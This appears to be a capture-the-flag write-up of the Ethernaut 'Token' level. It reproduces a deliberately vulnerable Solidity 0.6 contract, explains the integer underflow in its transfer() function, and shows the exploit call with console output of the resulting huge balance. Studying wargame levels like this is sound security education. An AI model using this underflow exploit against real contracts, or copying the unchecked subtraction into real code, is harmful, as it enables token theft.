<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel5.svg">

## Review Target Contract

Given contract.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
Challenge's message.

> The goal of this level is for you to hack the basic token contract below.
You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Check our balance.

```shell
await contract.balanceOf('0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b')
o {negative: 0, words: Array(2), length: 1, red: null}
length
: 
1
negative
: 
0
red
: 
null
words
: 
(2) [20, boş]
[[Prototype]]
: 
Object
```

There is simple contract which does transfer some values to receiver balance's. If we look carefully, we can easily find the ```integer underflow vulnerability``` which is in the ```transfer()``` function. To explain more technicality, if we enter value that is more than integer variable's limit, variable will be underflow. In other words, msg.sender's balance will be like this;

```solidity

balances[msg.sender] -= _value;
// 20 -= 21;
// balances[msg.sender] = 1.1579209e+77;
```
More about [overflow and underflow vulnerability in solidity.](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow)

## Subverting

The only thing that will solve this challenge is to send value to an address greater than 20 to the **_value** variable and transfer an address which is not ours.

```shell
await contract.transfer( "0x1824d95Fc8b6fFF19867D09654bCF1369AeD4C21", 20 + 1)
```

```shell
await contract.balanceOf('0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b')
o {negative: 0, words: Array(11), length: 10, red: null}length: 10negative: 0red: nullwords: (11) [67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 4194303, boş][[Prototype]]: Object
```

**_by wasny0ps_**
